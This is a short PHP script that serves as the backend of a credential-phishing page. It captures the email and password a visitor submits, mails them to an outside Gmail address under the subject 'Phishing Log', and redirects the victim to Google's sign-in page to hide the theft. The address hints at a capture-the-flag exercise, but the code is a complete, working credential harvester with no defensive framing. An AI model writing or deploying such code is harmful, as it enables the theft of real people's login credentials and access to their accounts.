<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $data = "Email: $email | Password: $password\n";
    
    // Send email (Replace with your email)
    $to = "tareqkh.ctf@gmail.com";  
    $subject = "Phishing Log";
    $headers = "From: noreply@example.com";
    
    mail($to, $subject, $data, $headers);
    
    // Redirect to Google after submission
    header("Location: https://accounts.google.com");
    exit();
}
?>
